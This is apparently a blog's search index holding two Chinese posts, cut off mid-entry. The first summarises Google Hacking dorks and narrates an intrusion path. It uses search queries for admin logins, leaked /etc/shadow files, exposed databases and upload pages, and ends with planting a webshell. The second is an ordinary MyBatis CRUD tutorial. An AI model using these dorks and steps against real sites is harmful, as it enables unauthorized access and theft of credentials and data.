<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Google Hacking语法总结</title>
      <link href="2021/01/21/Google%20Hacking%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>2021/01/21/Google%20Hacking%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>简单总结下Google Hacking语法。</p><h4 id="一、什么是Google-Hacking？"><a href="#一、什么是Google-Hacking？" class="headerlink" title="一、什么是Google Hacking？"></a>一、什么是Google Hacking？</h4><p><img src="http://img-blog.csdnimg.cn/20210121211831580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p>Google Hacking是指使用Google、百度等搜索引擎对某些特定网站主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。<hr></p><p>对于普通的用户而言，Google只是一款强大的搜索引擎，而对于渗透人员而言，它可能是一款绝佳的渗透工具。正因为Google的检索能力强大，我们可以构造特殊的关键字语法来搜索互联网上的的相关敏感信息。</p><h4 id="二、Google-Hacking的常用语法："><a href="#二、Google-Hacking的常用语法：" class="headerlink" title="二、Google Hacking的常用语法："></a>二、Google Hacking的常用语法：</h4><ul><li><p>site：找到与指定网站有联系的URL。例如输入<code>Site：family.chinaok.com</code>。所有和这个网站有联系的URL都会被显示。</p></li><li><p>intitle：搜索网页标题中包含有特定字符的网页。例如输入<code>intitle: cbi</code>，这样网页标题中带有cbi的网页都会被搜索出来。</p></li><li><p>alintitle，在结果的标题中同时包含多个关键词。例如：<code>allintitle:seo 搜索引擎</code>，起作用相当于<code>intitle:seo intitle:搜索引擎</code>。allintitle属于排他性指令，不能与其他指令结合使用。</p></li><li><p>inurl：搜索包含有特定字符的URL。例如输入<code>inurl:cbi</code>，则可以找到带有cbi字符的URL。</p></li><li><p>allinurl，结果的url中包含多个关键词。例如：<code>allinurl:byr jobs</code>，等于<code>inurl:byr inurl:jobs</code>。allinurl也是排他性指令</p></li><li><p>intext：搜索网页正文内容中的指定字符，例如输入<code>intext:cbi</code>。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。</p></li><li><p>allintext，在结果的正文内容中同时包含多个关键词。排他性指令。</p></li><li><p>filetype：搜索指定类型的文件。例如输入<code>filetype:cbi</code>，将返回所有以cbi结尾的文件URL。</p></li></ul><p>这些就是Google Hacking的常用语法，虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。<hr></p><p>了解了Google Hacking的基本语法后，我们来看一下黑客是如何使用这些语法进行Google Hack的，这些语法在渗透的过程中又会起到怎样的作用呢？</p><h4 id="三、Google-hacking常见的攻击规律："><a href="#三、Google-hacking常见的攻击规律：" class="headerlink" title="三、Google hacking常见的攻击规律："></a>三、Google hacking常见的攻击规律：</h4><p>Google hacking主要是发现那些 公告文件，安全漏洞，错误信息， 口令文件， 用户文件， 演示页面，登录页面， 安全文件， 敏感目录，商业信息，漏洞主机， 网站服务器检测等信息。攻击规律有：</p><h5 id="1、寻找网站的后台登录页面："><a href="#1、寻找网站的后台登录页面：" class="headerlink" title="1、寻找网站的后台登录页面："></a>1、寻找网站的后台登录页面：</h5><p>Intitle：</p><p> intitle语法通常被用来搜索网站的后台、特殊页面和文件，通过在Google中搜索<code>intitle:登录</code>、<code>intitle:管理</code>就可以找到很多网站的后台登录页面。此外，intitle语法还可以被用在搜索文件上，例如搜索<code>intitle:&quot;indexof&quot;etc/shadow</code>就可以找到Linux中因为配置不合理而泄露出来的用户密码文件。</p><p>Inurl：</p><p> Google Hack中，inurl发挥的作用的最大，主要可以分为以下两个方面：寻找网站后台登录地址，搜索特殊URL。</p><ol><li><p>寻找网站后台登录地址：<br>和intitle不同的是，inurl可以指定URL中的关键字，我们都知道网站的后台URL都是类似login.asp、admin.asp为结尾的，那么我们只要以<code>inurl:login.asp</code>、<code>inurl:admin.asp</code>为关键字进行搜索，同样可以找到很多网站的后台。此外，我们还可以搜索一下网站的数据库地址，以<code>inurl:data</code>、<code>inurl:db</code>为关键字进行搜索即可。</p></li><li><p>搜索特殊URL：<br>通过inurl语法搜索特殊URL，我们可以找到很多网站程序的漏洞，例如最早IIS中的Uncode目录遍历漏洞，我们可以构造<code>inurl:／winnt／system32／cmd exe?／c+dir</code>这样的关键字进行搜索，不过目前要搜索到存在这种古董漏洞的网站是比较困难的。再比如前段日子很火的上传漏洞，我们使用<code>inurl:upload.asp</code>或<code>inurl:upload_soft.asp</code>即可找到很多上传页面，此时再用工具进行木马上传就可以完成入侵。</p></li></ol><p>Intext：</p><p> intext的作用是搜索网页中的指定字符，这貌似在Google Hack中没有什么作用，不过在以<code>intext:to parent directory</code>为关键字进行搜索后，我们会很惊奇的发现，无数网站的目录暴露在我们眼前。我们可以在其中随意切换目录，浏览文件，就像拥有了一个简单的Webshell。形成这种现象的原因是由于IIS的配置疏忽。同样，中文IIS配置疏忽也可能出现类似的漏洞，我们用<code>intext:转到父目录</code>就可以找到很多有漏洞的中文网站。</p><h5 id="2、随意浏览网站中的文件："><a href="#2、随意浏览网站中的文件：" class="headerlink" title="2、随意浏览网站中的文件："></a>2、随意浏览网站中的文件：</h5><p><strong>Filetype</strong>：</p><p> Filetype的作用是搜索指定文件。假如我们要搜索网站的数据库文件，那么可以以<code>filetype:mdb</code>为关键字进行搜索，很快就可以下载到不少网站的数据库文件。当然，Filetype语法的作用不仅于此，在和其他语法配合使用的时候更能显示出其强大作用。</p><p><strong>Site</strong>：</p><p>黑客使用Site，通常都是做入侵前的信息收集。<code>Site:target.com</code>来获取相关网页，从中提取有用的资料。Site语法可以显示所有和目标网站有联系的页面，从中或多或少存在一些关于目标网站的资料，这对于黑客而言就是入侵的突破口，是关于目标网站的一份详尽的报告。</p><p>语法组合，威力加倍</p><p>虽然上文中介绍的这几个语法能各自完成入侵中的一些步骤，但是只使用一个语法进行入侵，其效率是很低下的。Google Hack的威力在于能将多个语法组合起来，这样就可以快速地找到我们需要的东西。下面我们来模拟黑客是如何使用Google语法组合来入侵一个网站的。</p><h5 id="3、搜索相关页面："><a href="#3、搜索相关页面：" class="headerlink" title="3、搜索相关页面："></a>3、搜索相关页面：</h5><p>下载网站的数据库：</p><p>搜索<code>Site:target.com Filetype:mdb</code>就可以寻找目标网站的数据库，其中的Site语法限定搜索范围，Filetype决定搜索目标。用这种方法有一个缺点，就是下载到数据库的成功率较低。在这里我们还可以采用另一种语法组合，前提是目标网站存在IIS配置缺陷，即可以随意浏览站点文件夹，我们搜索<code>Site:target.com intext:to parent directory</code>来确定其是否存在此漏洞。在确定漏洞存在后，可以使用<code>Site:target.com intext:to parent directory+intext.mdb</code>进行数据库的搜索。</p><h5 id="4、找到网站数据库："><a href="#4、找到网站数据库：" class="headerlink" title="4、找到网站数据库："></a>4、找到网站数据库：</h5><p>登录后台管理：</p><p>下载到数据库后，我们就可以从中找到网站的管理员帐户和密码，并登录网站的后台。对于网站后台的查找，可以使用语法组合<code>Site:target.com intitle:管理</code>或者<code>Site:target.com inurl:login.asp</code>进行搜索，当然我们可以在这里进行联想，以不同的字符进行搜索，这样就有很大的概率可以找到网站的后台管理地址。接下去黑客就可以在后台上传Webshell，进一步提升权限，在此不再阐述。</p><h5 id="5、利用其他漏洞："><a href="#5、利用其他漏洞：" class="headerlink" title="5、利用其他漏洞："></a>5、利用其他漏洞：</h5><p>如果下载数据库不成功，我们还可以尝试其他的入侵方法。例如寻找上传漏洞，搜索 <code>Site:target.com inurl:upload.asp</code>。此外，我们还可以根据一些程序漏洞的特征，定制出Google Hack的语句。</p><h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4><p>给大家推荐一个网站：<a href="https://www.exploit-db.com/google-hacking-database">Exploit DB</a>上有很多大佬总结分享的构造语句，感兴趣的同学可以去看下。<br><img src="http://img-blog.csdnimg.cn/20210121214752387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>参考文章：<br><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12489218.html">https://www.cnblogs.com/H4ck3R-XiX/p/12489218.html</a><br><a href="https://www.cnblogs.com/auguse/articles/11784307.html">https://www.cnblogs.com/auguse/articles/11784307.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis框架学习</title>
      <link href="2021/01/20/Java%20EE%E2%80%94%E2%80%94Mybatis%20%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/01/20/Java%20EE%E2%80%94%E2%80%94Mybatis%20%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="一、MyBatis-框架概述："><a href="#一、MyBatis-框架概述：" class="headerlink" title="一、MyBatis 框架概述："></a>一、MyBatis 框架概述：</h4><p><strong>1、什么是mybatis</strong>：</p><ul><li><p>mybatis 是一个优秀的基于 java 的持久层框架，它内部封装了 jdbc，使开发者只需要关注 sql 语句本身，而不需要花费精力去处理加载驱动、创建连接、创建 statement 等繁杂的过程。</p></li><li><p>mybatis 通过 xml 或注解的方式将要执行的各种 statement 配置起来，并通过 java 对象和 statement 中sql 的动态参数进行映射生成最终执行的 sql 语句，最后由 mybatis 框架执行 sql 并将结果映射为 java 对象并返回。</p></li><li><p>采用 ORM 思想解决了实体和数据库映射的问题，对 jdbc 进行了封装，屏蔽了 jdbc api 底层访问细节，使我们不用与 jdbc api 打交道，就可以完成对数据库的持久化操作。</p></li></ul><p><strong>2、mybatis在三层架构中的位置</strong></p><p><img src="http://img-blog.csdnimg.cn/20201009105844161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="二、-Mybatis-框架入门"><a href="#二、-Mybatis-框架入门" class="headerlink" title="二、 Mybatis 框架入门"></a>二、 Mybatis 框架入门</h4><p><strong>1、基于XML的方式</strong>：</p><p>1、创建 maven 工程：<br><img src="http://img-blog.csdnimg.cn/20201011112115858.png" alt="在这里插入图片描述"><br>2、添加 Mybatis的坐标：</p><ul><li>在 pom.xml 文件中添加 Mybatis3.4.5 的坐标，如下：</li></ul><pre><code class="xml">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;            &lt;version&gt;3.4.5&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;mysql&lt;/groupId&gt;            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;            &lt;version&gt;5.1.6&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j&lt;/artifactId&gt;            &lt;version&gt;1.2.12&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.10&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>3、编写 User 实体类：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer id;    private String username;    private Date birthday;    private String address;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public Date getBirthday() &#123;        return birthday;    &#125;    public void setBirthday(Date birthday) &#123;        this.birthday = birthday;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, birthday=&quot; + birthday +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>4、编写持久层接口 IUserDao：</p><pre><code class="java">public interface IUserDao &#123;    /*     *查询所有操作     * */    List&lt;User&gt; findAll();&#125;</code></pre><p>5、编写持久层接口的映射文件 IUserDao.xml：</p><p>注意：</p><ul><li>创建位置：必须和持久层接口在相同的包中。</li><li>名称：必须以持久层接口名称命名文件名，扩展名是.xml</li></ul><p>例：都是在com.smk.dao包中<br><img src="http://img-blog.csdnimg.cn/2020101111305136.png" alt="在这里插入图片描述"></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.smk.dao.IUserDao&quot;&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;com.smk.domain.User&quot;&gt;        select * from user    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>不要忘记在映射配置中告知mybatis要封装到哪个实体类中。</p><p>配置的方式：指定实体类的全限定类名 即：<code>resultType=&quot;com.smk.domain.User&quot;</code></p><p>6、 编写 SqlMapConfig.xml 配置文件：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;!--mybatis的主配置文件--&gt;&lt;configuration&gt;    &lt;!-- 配置环境--&gt;    &lt;environments default=&quot;mysql&quot;&gt;        &lt;!-- 配置mysql环境--&gt;        &lt;environment id=&quot;mysql&quot;&gt;            &lt;!--配置事物的类型--&gt;            &lt;transactionManager type=&quot;JDBC&quot;&gt;&lt;/transactionManager&gt;            &lt;!--配置数据源/连接池2--&gt;            &lt;dataSource type=&quot;POOLED&quot;&gt;                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/my_batis?useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt;                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;                &lt;property name=&quot;password&quot; value=&quot;&quot;/&gt;            &lt;/dataSource&gt;        &lt;/environment&gt;    &lt;/environments&gt;    &lt;!--指定映射配置文件的位置，映射配置文件指的是每个dao独立的配置文件--&gt;    &lt;mappers&gt;        &lt;mapper resource=&quot;com/smk/dao/IUserDao.xml&quot;&gt;&lt;/mapper&gt;    &lt;/mappers&gt;&lt;/configuration&gt;</code></pre><p>7、编写测试类：</p><pre><code class="java">public class mybatis &#123;    public static void main(String[] args) throws IOException &#123;        //1.读取配置文件        InputStream in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);        //2.创建一个SqlsessionFactory工厂        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();        SqlSessionFactory factory = builder.build(in);        //3.使用工厂生产一个Sqlsession对象        SqlSession session = factory.openSession();        //4.使用SqlSession创建Dao接口对象        IUserDao userDao = session.getMapper(IUserDao.class);        //5.使用代理对象执行方法        List&lt;User&gt; users = userDao.findAll();        for (User user : users) &#123;            System.out.println(user);        &#125;        //6.释放资源        session.close();        in.close();    &#125;&#125;</code></pre><p>在测试类中运行：</p><p><img src="http://img-blog.csdnimg.cn/20201011114342875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><hr><p><strong>2、基于注解的方式</strong>：</p><p>在基于注解的的方式下就不再需要 IUserDao.xml配置文件，同时需要在SqlMapConfig.xml中的mapper配置时，使用class属性指定dao接口的全限定类名。</p><p>1、在持久层接口中添加注解：</p><pre><code class="java">public interface IUserDao &#123;    /*     *查询所有操作     * */    @Select(&quot;select * from user&quot;)    List&lt;User&gt; findAll();&#125;</code></pre><p>2、修改 SqlMapConfig.xml：</p><pre><code class="xml">&lt;mappers&gt;        &lt;mapper class=&quot;com.smk.dao.IUserDao&quot;&gt;&lt;/mapper&gt;&lt;/mappers&gt;</code></pre><blockquote><p>注意：在使用基于注解的 Mybatis 配置时，须移除 xml 的映射配置（IUserDao.xml）。</p></blockquote><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011123940792.png#pic_center" alt="在这里插入图片描述"></p><p>补充：</p><ul><li>不管使用XML还是注解配置， Mybatis是支持写dao实现类的。</li><li>但在在实际开发中，都是越简便越好，所以都是采用不写dao实现类的方式。</li></ul><h4 id="三、-基于代理-Dao-实现-CRUD-操作"><a href="#三、-基于代理-Dao-实现-CRUD-操作" class="headerlink" title="三、 基于代理 Dao 实现 CRUD 操作"></a>三、 基于代理 Dao 实现 CRUD 操作</h4><h5 id="1、根据-ID-查询："><a href="#1、根据-ID-查询：" class="headerlink" title="1、根据 ID 查询："></a>1、根据 ID 查询：</h5><p>步骤：</p><p>1、在持久层接口中添加 findById 方法：</p><pre><code class="java">public interface IUserDao &#123;    //根据 id 查询    User findById (Integer userId);&#125;</code></pre><p>2、配置映射文件：</p><pre><code class="java">&lt;mapper namespace=&quot;com.smk.dao.IUserDao&quot;&gt;    &lt;select id=&quot;findById&quot; resultType=&quot;com.smk.domain.User&quot; parameterType=&quot;int&quot;&gt;        select * from user where id= #&#123;id&#125;    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p><strong>解释</strong>：</p><ul><li>resultType 属性：用于指定结果集的类型。</li><li>parameterType 属性：用于指定传入参数的类型。</li><li>sql 语句中使用<code>#&#123;&#125;</code>字符：它代表占位符，相当于原来 jdbc 部分所学的，都是用于执行语句时替换实际的数据。具体的数据是由<code>#&#123;&#125;</code>里面的内容决定的。</li><li><code>#&#123;&#125;</code>中内容的写法：由于数据类型是基本类型，所以此处可以随意写。</li></ul><p>3、 在测试类添加测试：</p><pre><code class="java">public class mybatis &#123;    private InputStream in;    private SqlSessionFactory factory;    private SqlSession session;    private IUserDao userDao;    @Test    public void testFindOne() &#123;        //6.执行操作        User user = userDao.findById(41);        System.out.println(user);    &#125;    @Before//在测试方法执行之前执行    public void init() throws Exception &#123;        //1.读取配置文件        in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);        //2.创建构建者对象        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();        //3.创建 SqlSession 工厂对象        factory = builder.build(in);        //4.创建 SqlSession 对象        session = factory.openSession();        //5.创建 Dao 的代理对象        userDao = session.getMapper(IUserDao.class);    &#125;    @After//在测试方法执行完成之后执行    public void destroy() throws Exception &#123;        session.commit();//提交事务；在增删改时需要提交，查询时不需要。        //7.释放资源        session.close();        in.close();    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011203422131.png#pic_center" alt="在这里插入图片描述"></p><h5 id="2、保存操作："><a href="#2、保存操作：" class="headerlink" title="2、保存操作："></a>2、保存操作：</h5><p>同样的套路</p><p><strong>1、在持久层接口中添加新增方法</strong>：</p><pre><code class="java">  // 保存用户  int saveUser(User user);</code></pre><p><strong>2、配置映射文件</strong>：</p><pre><code class="java">&lt;insert id=&quot;saveUser&quot; parameterType=&quot;com.smk.domain.User&quot;&gt;        insert into user(username,birthday,sex,address) value (#&#123;username&#125;,#&#123;birthday&#125;,#&#123;sex&#125;,#&#123;address&#125;)&lt;/insert&gt;</code></pre><p>解释：</p><p> <code>#&#123;&#125;</code>中内容的写法：</p><ul><li>由于保存方法的参数是 一个 User 对象，此处要写 User 对象中的属性名称。<br>它用的是 ognl 表达式。</li></ul><p>ognl 表达式：</p><ul><li><p>它是 apache 提供的一种表达式语言，全称是：Object Graphic Navigation Language 对象图导航语言，它是按照一定的语法格式来获取数据的。语法格式就是使用 <code>#&#123;对象.对象&#125;</code> 的方式。</p></li><li><p><code>#&#123;user.username&#125;</code> 它会先去找 user 对象，然后在 user 对象中找到 username 属性，并调用 getUsername() 方法把值取出来。但是我们在 parameterType 属性上指定了实体类名称，所以可以省略 user 而直接写 username。</p></li></ul><p><strong>3、测试</strong>：</p><pre><code class="java"> @Test    public void testSave() &#123;        User user = new User();        user.setUsername(&quot;modify User property&quot;);        user.setAddress(&quot;北京市顺义区&quot;);        user.setSex(&quot;男&quot;);        user.setBirthday(new Date());        System.out.println(&quot;保存操作之前：&quot; + user);        //5.执行保存方法        userDao.saveUser(user);        System.out.println(&quot;保存操作之后：&quot; + user);    &#125;</code></pre><p><strong>注意</strong>：</p><p>在实现 <strong>增删改</strong> 时需要进行控制事务的提交。</p><p>如何在mybatis 中如何控制事务提交？</p><ul><li>可以使用：<code>session.commit();</code> 来实现事务提交。加入事务提交后的代码如下：</li></ul><pre><code class="java">@After//在测试方法执行完成之后执行public void destroy() throws Exception&#123;    session.commit();    //7.释放资源    session.close();    in.close();&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011224511758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201011224811344.png" alt="在这里插入图片描述"><br><strong>问题扩展：获取新增用户 id 的返回值</strong>：</p><p>新增用户后，同时还要返回当前新增用户的 id 值，因为 id 是由数据库的自动增长来实现的，所以就相当于我们要在新增后将自动增长 auto_increment 的值返回。</p><pre><code class="java">    &lt;insert id=&quot;saveUser&quot; parameterType=&quot;com.smk.domain.User&quot;&gt;        &lt;!-- 配置保存时获取插入的id   keypreperty：代表要返回的值对应实体类里的字段 ，keyColumn代表数据库的字段名--&gt;        &lt;selectKey keyProperty=&quot;id&quot; keyColumn=&quot;id&quot; resultType=&quot;int&quot;&gt;            select last_insert_id();        &lt;/selectKey&gt;        insert into user(username,birthday,sex,address) value (#&#123;username&#125;,#&#123;birthday&#125;,#&#123;sex&#125;,#&#123;address&#125;)    &lt;/insert&gt;</code></pre><p>再次执行测试：</p><p><img src="http://img-blog.csdnimg.cn/20201012210239364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到 id 的值已经获取到了。</p><h5 id="3、用户更新："><a href="#3、用户更新：" class="headerlink" title="3、用户更新："></a>3、用户更新：</h5><p>1、在持久层接口中添加更新方法：</p><pre><code class="java"> //更新用户    int updateUser(User user);</code></pre><p>2、配置映射文件：</p><pre><code class="java">    &lt;update id=&quot;updateUser&quot; parameterType=&quot;com.smk.domain.User&quot;&gt;        update user set username=#&#123;username&#125;,birthday=#&#123;birthday&#125;,sex=#&#123;sex&#125;, address=#&#123;address&#125; where id=#&#123;id&#125;    &lt;/update&gt;</code></pre><p>3、更新的测试方法：</p><pre><code class="java"> @Test    public void testUpdateUser() throws Exception &#123;        //1.根据 id 查询        User user = userDao.findById(52);        //2.更新操作        user.setAddress(&quot;北京市顺义区&quot;);        int res = userDao.updateUser(user);        System.out.println(res);    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011232354868.png#pic_center" alt="在这里插入图片描述"></p><h5 id="4、-用户删除："><a href="#4、-用户删除：" class="headerlink" title="4、 用户删除："></a>4、 用户删除：</h5><p>1、在持久层接口中添加删除方法：</p><pre><code class="java"> //删除用户    int deleteUser(int uid);</code></pre><p>2、配置映射文件：</p><pre><code class="java">&lt;delete id=&quot;deleteUser&quot; parameterType=&quot;int&quot;&gt;        delete from user where id=#&#123;uid&#125;&lt;/delete&gt;</code></pre><p>3、删除的测试方法：</p><pre><code class="java">@Test    public void testdeleteUser()&#123;        int res = userDao.deleteUser(52);        System.out.println(res);    &#125;</code></pre><p>至此基于mybatis的增删改查就完成了。<hr></p><h4 id="四、Mybatis-的参数深入"><a href="#四、Mybatis-的参数深入" class="headerlink" title="四、Mybatis 的参数深入"></a>四、Mybatis 的参数深入</h4><p>注：Mybatis使用ognl表达式解析对象字段的值，<code>#&#123;&#125;</code>或<code>$&#123;&#125;</code>括号中的值为pojo属性名称。</p><p><strong>什么是ognl</strong>：</p><p>Object Graphic Navigation Language<br>&nbsp;&nbsp;对象    &nbsp;&nbsp;&nbsp;&nbsp;图&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;导航    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;语言</p><p>它是通过对象的取值方法来获取数据。在写法上把get给省略了。</p><p> 比如：我们获取用户的名称</p><ul><li> 类中的写法：user.getUsername()</li><li>OGNL表达式写法：user.username</li></ul><p>mybatis中为什么能直接写username，而不用<code>user.</code>呢？</p><ul><li>因为在parameterType中已经提供了属性所属的类，所以此时不需要写对象名。<hr></li></ul><p> <strong>1、parameterType 配置参数</strong>：</p><p> SQL 语句的传参是通过使用标签的 parameterType 属性来设定。该属性的取值可以是基本类型，引用类型（例如:String 类型），还可以是实体类类型（POJO 类）。同时也可以使用实体类的包装类。</p><p><strong>2、传递 pojo 包装对象</strong>：</p><p>开发中通过 pojo 传递查询条件 。当查询条件是综合的查询条件：不仅包括用户查询条件还包括其它的查询条件（比如将用户购买商品信息也作为查询条件），这时可以使用包装对象传递输入参数。即：<font color = red> Pojo 类中包含 pojo</font> 。</p><p>例：</p><p>需求：根据用户名查询用户信息，查询条件放到 QueryVo 的 user 属性中。</p><p>1、编写 QueryVo：</p><pre><code class="java">public class QueryVo &#123;    private User user;    public User getUser() &#123;        return user;    &#125;    public void setUser(User user) &#123;        this.user = user;    &#125;&#125;</code></pre><p>2、编写持久层接口：</p><pre><code class="java">    //根据 QueryVo 中的条件查询用户    List&lt;User&gt; findByVo(QueryVo vo);</code></pre><p>3、配置映射文件：</p><pre><code class="java">    &lt;!-- 根据用户名称模糊查询，参数变成一个 QueryVo 对象了 --&gt;    &lt;select id=&quot;findByVo&quot; resultType=&quot;com.smk.domain.User&quot; parameterType=&quot;com.smk.domain.QueryVo&quot;&gt;        select * from user where username like #&#123;user.username&#125;;    &lt;/select&gt;</code></pre><p>4、添加测试类：</p><pre><code class="java">    @Test    public void testFindByQueryVo() &#123;        QueryVo vo = new QueryVo();        User user = new User();        user.setUsername(&quot;%王%&quot;);        vo.setUser(user);        List&lt;User&gt; users = userDao.findByVo(vo);        for (User u : users) &#123;            System.out.println(u);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201014223858731.png#pic_center" alt="在这里插入图片描述"></p><h4 id="五、Mybatis的输出结果封装"><a href="#五、Mybatis的输出结果封装" class="headerlink" title="五、Mybatis的输出结果封装"></a>五、Mybatis的输出结果封装</h4><h5 id="1、resultType的配置结果类型："><a href="#1、resultType的配置结果类型：" class="headerlink" title="1、resultType的配置结果类型："></a>1、resultType的配置结果类型：</h5><p> resultType 属性可以指定结果集的类型，它支持基本数据类型和实体类数据类型。</p><p> 它和 parameterType 一样，如果注册过类型别名的，可以直接使用别名。</p><p> 没有注册过的必须使用全限定类名。</p><p>例如：我们的实体类此时必须是全限定类名，同时，当是实体类名称时，实体类中的属性名称必须和查询语句中的列名（即数据库里的表名列名）保持一致，否则无法实现封装。</p><p><strong>特殊情况示例</strong>：</p><p>当实体类属性和数据库表的列名已经不一致时</p><p>1、实体类代码：</p><pre><code class="java">public class User2 &#123;    public class User implements Serializable &#123;        private Integer userId;        private String userName;        private Date userBirthday;        private String userSex;        private String userAddress;        public Integer getUserId() &#123;            return userId;        &#125;        public void setUserId(Integer userId) &#123;            this.userId = userId;        &#125;        public String getUserName() &#123;            return userName;        &#125;        public void setUserName(String userName) &#123;            this.userName = userName;        &#125;        public Date getUserBirthday() &#123;            return userBirthday;        &#125;        public void setUserBirthday(Date userBirthday) &#123;            this.userBirthday = userBirthday;        &#125;        public String getUserSex() &#123;            return userSex;        &#125;        public void setUserSex(String userSex) &#123;            this.userSex = userSex;        &#125;        public String getUserAddress() &#123;            return userAddress;        &#125;        public void setUserAddress(String userAddress) &#123;            this.userAddress = userAddress;        &#125;        @Override        public String toString() &#123;            return &quot;User [userId=&quot; + userId + &quot;, userName=&quot; + userName + &quot;, userBirthday=&quot;                    + userBirthday + &quot;, userSex=&quot;                    + userSex + &quot;, userAddress=&quot; + userAddress + &quot;]&quot;;        &#125;    &#125;&#125;</code></pre><p>2、映射配置：</p><pre><code class="java">   // 查询所有用户    List&lt;User&gt; findAll();</code></pre><p>3、测试查询结果：</p><pre><code class="java">    @Test    public void testFindAll() &#123;        List&lt;User2&gt; users = userDao.findAll();        for (User2 user : users) &#123;            System.out.println(user);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201106204232953.png#pic_center" 